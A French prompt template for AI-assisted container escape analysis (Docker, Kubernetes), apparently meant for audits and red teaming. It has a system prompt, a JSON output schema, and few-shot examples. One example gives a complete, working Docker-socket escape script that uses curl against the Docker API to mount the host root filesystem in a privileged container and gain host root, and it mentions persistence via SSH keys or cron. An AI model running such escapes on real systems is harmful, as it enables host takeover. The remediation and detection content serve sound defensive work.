# Container Escape Analysis

## Quand utiliser ce prompt

Utiliser ce prompt **lors de l'evaluation du risque d'evasion de conteneur** pour determiner si un conteneur (Docker, Kubernetes, ou autre runtime) peut etre compromis pour acceder au host sous-jacent. Ideal pour :

- Audit de Dockerfiles et docker-compose.yml pour des configurations dangereuses
- Analyse de pod specs Kubernetes pour des vecteurs d'evasion
- Post-exploitation apres la compromission d'un conteneur pour evaluer les options d'escape
- Red team exercises necessitant un pivot du conteneur vers le host
- Evaluation de la posture de securite des workloads conteneurises
- Revue de configurations de runtime (containerd, CRI-O, gVisor, Kata)

## Variables a remplir

| Variable | Description | Exemple |
|---|---|---|
| `{{TARGET}}` | Nom du conteneur ou du workload | `api-gateway` ou `monitoring-agent pod` |
| `{{CONTEXT}}` | Contexte de l'analyse | `Post-exploitation, shell dans un conteneur, cherche a pivoter vers le node` |
| `{{SCOPE}}` | Perimetre | `Conteneur compromis + configuration fournie` |
| `{{CONTAINER_CONFIG}}` | Configuration du conteneur (Dockerfile, docker-compose, K8s pod spec) | `(coller la configuration)` |
| `{{RUNTIME_INFO}}` | Informations sur le runtime | `Docker 24.0, containerd 1.7, kernel 5.15, cgroup v2` |
| `{{KERNEL_VERSION}}` | Version du kernel du host | `5.15.0-generic` |
| `{{CAPABILITIES}}` | Capabilities du conteneur (output de capsh ou /proc/self/status) | `(optionnel, output de capsh --print)` |

---

## System Prompt

```
Tu es un expert en securite des conteneurs et evasion de conteneurs avec 12 ans d'experience en red teaming et pentest d'infrastructures conteneurisees. Tu maitrises parfaitement :

- Les mecanismes d'isolation des conteneurs : namespaces (mount, PID, network, user, UTS, IPC, cgroup), cgroups, seccomp, AppArmor, SELinux, capabilities
- Les techniques d'evasion : exploitation du Docker socket, mode privilegie, capabilities dangereuses, host namespaces, hostPath mounts, kernel exploits, cgroup escape
- Les runtimes de conteneurs : Docker (runc), containerd, CRI-O, gVisor, Kata Containers, Firecracker
- Les vulnerabilites connues des runtimes (CVE-2019-5736 runc, CVE-2020-15257 containerd, CVE-2022-0185 kernel)
- L'exploitation de cgroup v1 vs v2 pour l'evasion
- Les techniques de post-exploitation en environnement conteneurise
- L'evasion specifique aux managed services (ECS, EKS, AKS, GKE)

Ta methodologie d'analyse :
1. Identifier les mecanismes d'isolation en place
2. Identifier les breaks dans l'isolation (capabilities, mounts, namespaces partages)
3. Pour chaque break, evaluer la faisabilite d'evasion
4. Construire un chemin d'attaque complet du conteneur au host
5. Proposer des remediations pour chaque vecteur

Tu dois IMPERATIVEMENT :
1. Analyser chaque vecteur d'evasion independamment et en combinaison
2. Fournir des commandes exactes pour l'exploitation
3. Tenir compte de la version du kernel et du runtime
4. Distinguer les evasions garanties (mode privilegie) des evasions conditionnelles (kernel exploit)
5. Fournir les remediations avec la configuration corrigee

Tu ne dois JAMAIS :
- Ignorer le contexte (certaines "misconfigurations" sont necessaires pour certains workloads)
- Presenter un kernel exploit comme fiable sans verifier la version
- Oublier que cgroup v2 change significativement les techniques d'evasion
- Omettre les prerequis pour chaque technique d'evasion
```

---

## User Prompt

```xml
<context>
Engagement : {{CONTEXT}}
Runtime : {{RUNTIME_INFO}}
Kernel : {{KERNEL_VERSION}}
Perimetre : {{SCOPE}}
</context>

<target>
Conteneur : {{TARGET}}

Configuration du conteneur :
```yaml
{{CONTAINER_CONFIG}}
```

Capabilities (si disponibles) :
{{CAPABILITIES}}
</target>

<instructions>
Analyse la configuration du conteneur pour identifier tous les vecteurs d'evasion possibles. Pour chaque vecteur :

1. **Identification** : le mecanisme d'isolation compromis ou absent
2. **Faisabilite** : la probabilite de succes de l'evasion
3. **Exploitation** : les commandes exactes pour exploiter le vecteur
4. **Prerequis** : les conditions necessaires pour l'exploitation
5. **Impact** : ce que l'attaquant obtient apres l'evasion
6. **Remediation** : la configuration corrigee

Analyse specifiquement :

**Docker socket :**
- /var/run/docker.sock monte dans le conteneur
- Acces TCP au Docker API (port 2375/2376)
- Exploitation : creer un conteneur privilegie monte sur / du host

**Mode privilegie :**
- privileged: true / --privileged
- Exploitation : mount des devices, acces /dev, nsenter vers le host

**Capabilities dangereuses :**
- SYS_ADMIN : mount, pivot_root, namespace manipulation
- SYS_PTRACE : ptrace des processus host si hostPID
- DAC_READ_SEARCH : lire n'importe quel fichier via open_by_handle_at
- SYS_MODULE : charger des modules kernel
- NET_ADMIN : manipulation reseau, ARP poisoning
- SYS_RAWIO : acces direct aux devices

**Host namespaces :**
- hostPID : voir et ptrace les processus host
- hostNetwork : acces au reseau host (loopback, services internes)
- hostIPC : acces aux segments de memoire partagee host

**Montages hostPath :**
- / ou /etc ou /var monte en lecture-ecriture
- /proc/sysrq-trigger, /proc/sys
- /dev monte (acces aux block devices)

**Kernel exploits :**
- CVE applicables a la version du kernel
- Exploits de cgroup (release_agent pour cgroup v1)
- Exploits de namespace (CVE-2022-0185, etc.)

<thinking>
Avant l'analyse :
- Le conteneur est-il en mode privilegie ?
- Quelles capabilities sont presentes au-dela du set par defaut ?
- Y a-t-il des hostPath mounts dangereux ?
- Le Docker socket est-il accessible ?
- Les host namespaces sont-ils partages ?
- Quel runtime est utilise (runc est plus exploitable que gVisor/Kata) ?
- La version du kernel est-elle vulnerable a des exploits connus ?
- Cgroup v1 ou v2 ? (change les techniques d'evasion)
</thinking>
</instructions>

<output_format>
Reponds en JSON structure suivant ce schema :

{
  "metadata": {
    "target": "string",
    "runtime": "string",
    "kernel_version": "string",
    "cgroup_version": "v1|v2|unknown",
    "date_analyzed": "ISO-8601",
    "total_escape_vectors": "number",
    "highest_severity": "critical|high|medium|low",
    "escape_feasibility": "guaranteed|highly_likely|possible|unlikely|none"
  },
  "isolation_assessment": {
    "namespaces": {
      "mount": "isolated|shared",
      "pid": "isolated|shared (hostPID)",
      "network": "isolated|shared (hostNetwork)",
      "ipc": "isolated|shared (hostIPC)",
      "uts": "isolated|shared",
      "user": "isolated|shared|remapped",
      "cgroup": "isolated|shared"
    },
    "capabilities": {
      "effective": ["string (list of effective capabilities)"],
      "dangerous_capabilities": [
        {
          "capability": "string",
          "risk": "string",
          "escape_technique": "string"
        }
      ]
    },
    "seccomp_profile": "string (default|custom|unconfined)",
    "apparmor_profile": "string (default|custom|unconfined)",
    "selinux": "string (enforcing|permissive|disabled|not_applicable)",
    "privileged_mode": "boolean",
    "read_only_rootfs": "boolean",
    "allow_privilege_escalation": "boolean"
  },
  "escape_vectors": [
    {
      "id": "ESC-001",
      "name": "string",
      "severity": "critical|high|medium|low",
      "category": "docker_socket|privileged_mode|dangerous_capability|host_namespace|host_mount|kernel_exploit|runtime_vuln|cgroup_escape",
      "description": "string",
      "misconfiguration": "string (the specific config that enables this)",
      "prerequisites": ["string"],
      "feasibility": "guaranteed|highly_likely|possible|unlikely",
      "exploitation": {
        "steps": [
          {
            "step": "number",
            "command": "string (exact command to run inside the container)",
            "description": "string",
            "expected_output": "string"
          }
        ],
        "full_exploit_script": "string (complete script for the escape)",
        "time_to_exploit": "string (seconds|minutes|hours)"
      },
      "impact": {
        "access_gained": "string (root on host, read host files, host network, etc.)",
        "persistence": "string (can attacker persist after container restart?)",
        "lateral_movement": "string (what can attacker reach from the host?)"
      },
      "detection": {
        "detectable_by": ["string (audit logs, falco rules, syscall monitoring, etc.)"],
        "stealth_level": "string (noisy|moderate|stealthy)"
      },
      "remediation": {
        "description": "string",
        "fixed_configuration": "string (corrected Dockerfile/docker-compose/K8s YAML)",
        "additional_controls": ["string"]
      }
    }
  ],
  "combined_attack_paths": [
    {
      "path_name": "string",
      "vector_ids": ["string"],
      "description": "string",
      "full_attack_chain": "string"
    }
  ],
  "kernel_vulnerability_assessment": [
    {
      "cve": "string",
      "description": "string",
      "affected_versions": "string",
      "applicable_to_target": "boolean|unknown",
      "exploit_available": "boolean",
      "notes": "string"
    }
  ],
  "recommendations": [
    {
      "priority": "number",
      "action": "string",
      "vector_ids": ["string"],
      "effort": "string"
    }
  ],
  "confidence_notes": [
    {
      "area": "string",
      "confidence": "high|medium|low",
      "note": "string"
    }
  ]
}
</output_format>

<constraints>
- Les commandes d'exploitation doivent etre exactes et executables dans un conteneur
- Chaque vecteur doit avoir ses prerequis clairement documentes
- Les kernel exploits doivent etre valides pour la version specifiee dans {{KERNEL_VERSION}}
- Distinguer cgroup v1 et v2 dans les techniques d'evasion
- Les remediations doivent inclure la configuration corrigee complete
- Ne pas ignorer les controls de detection (Falco, auditd, etc.)
- Signaler les faux positifs : certains "vecteurs" ne sont pas exploitables dans le contexte
</constraints>
```

---

## Prefill

```
{"metadata":{"target":"
```

---

## Exemples Few-Shot

### Exemple 1 : Docker socket mount

```json
{
  "id": "ESC-001",
  "name": "Container Escape via Docker Socket Mount",
  "severity": "critical",
  "category": "docker_socket",
  "description": "Le Docker socket (/var/run/docker.sock) est monte dans le conteneur. Cela donne un acces complet a l'API Docker du host, permettant de creer des conteneurs privilegies montes sur le filesystem root du host.",
  "misconfiguration": "volumes:\n  - /var/run/docker.sock:/var/run/docker.sock",
  "prerequisites": ["Acces shell dans le conteneur", "curl ou docker CLI disponible dans le conteneur (ou telechargeable)"],
  "feasibility": "guaranteed",
  "exploitation": {
    "steps": [
      {"step": 1, "command": "ls -la /var/run/docker.sock", "description": "Verifier la presence du socket Docker", "expected_output": "srw-rw---- 1 root docker ... /var/run/docker.sock"},
      {"step": 2, "command": "curl -s --unix-socket /var/run/docker.sock http://localhost/version | jq .", "description": "Verifier l'acces a l'API Docker via le socket", "expected_output": "JSON avec la version Docker du host"},
      {"step": 3, "command": "curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"chroot /host /bin/bash\"],\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host\"}],\"HostConfig\":{\"Privileged\":true}}' http://localhost/containers/create", "description": "Creer un conteneur privilegie avec le root filesystem du host monte", "expected_output": "JSON avec l'ID du conteneur cree"},
      {"step": 4, "command": "curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/{CONTAINER_ID}/start", "description": "Demarrer le conteneur", "expected_output": "204 No Content"},
      {"step": 5, "command": "curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Cmd\":[\"/bin/bash\"],\"Tty\":true}' http://localhost/containers/{CONTAINER_ID}/exec", "description": "Obtenir un shell root sur le host", "expected_output": "Shell interactif avec acces root au filesystem complet du host"}
    ],
    "full_exploit_script": "#!/bin/sh\n# Container escape via Docker socket\n# Run from inside the container with docker.sock access\n\nCONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock -X POST \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine:latest\",\"Cmd\":[\"/bin/sh\"],\"Tty\":true,\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host\"}],\"HostConfig\":{\"Privileged\":true}}' \\\n  http://localhost/containers/create | jq -r '.Id')\n\ncurl -s --unix-socket /var/run/docker.sock -X POST \\\n  http://localhost/containers/$CONTAINER_ID/start\n\necho \"[+] Escape container created: $CONTAINER_ID\"\necho \"[+] Use: docker exec -it $CONTAINER_ID chroot /host /bin/bash\"\necho \"[+] Or use curl to exec into it via the socket\"",
    "time_to_exploit": "seconds"
  },
  "impact": {
    "access_gained": "Root access on the host via chroot into /host. Full control over all containers on the host via Docker API.",
    "persistence": "Yes - can add SSH keys to host, create cron jobs, modify systemd services",
    "lateral_movement": "Access to all containers on the host, host network, cloud metadata service (169.254.169.254), and potentially other hosts on the network"
  },
  "detection": {
    "detectable_by": ["Falco rule: 'container_drift' or 'docker_client_in_container'", "Docker audit logs", "auditd monitoring of docker.sock access"],
    "stealth_level": "moderate (Docker socket access and container creation are logged if audit is enabled)"
  },
  "remediation": {
    "description": "Supprimer le montage du Docker socket. Si le conteneur a besoin d'interagir avec Docker, utiliser une approche DinD (Docker in Docker) isolee ou un socket proxy restrictif.",
    "fixed_configuration": "# docker-compose.yml\nservices:\n  api-gateway:\n    image: acmecorp/api-gateway:v2.1.0\n    # REMOVED: - /var/run/docker.sock:/var/run/docker.sock\n    volumes:\n      - app-data:/data\n    security_opt:\n      - no-new-privileges:true\n    read_only: true",
    "additional_controls": [
      "Si Docker socket est absolument necessaire, utiliser un socket proxy (Tecnativa/docker-socket-proxy) avec des permissions minimales",
      "Activer le monitoring Falco pour detecter les acces au Docker socket depuis les conteneurs"
    ]
  }
}
```

### Exemple 2 : Cgroup v1 release_agent escape

```json
{
  "id": "ESC-003",
  "name": "Cgroup v1 release_agent Escape (requires SYS_ADMIN + cgroup v1)",
  "severity": "critical",
  "category": "cgroup_escape",
  "description": "Avec la capability SYS_ADMIN et cgroup v1, un conteneur peut monter le cgroup filesystem, ecrire dans release_agent, et executer des commandes arbitraires sur le host lorsque le dernier processus du cgroup se termine.",
  "misconfiguration": "securityContext:\n  capabilities:\n    add: [SYS_ADMIN]\n# Combined with cgroup v1 on the host",
  "prerequisites": ["CAP_SYS_ADMIN capability", "Cgroup v1 (NOT v2)", "Acces shell dans le conteneur", "AppArmor desactive ou profil permissif"],
  "feasibility": "highly_likely"
}
```
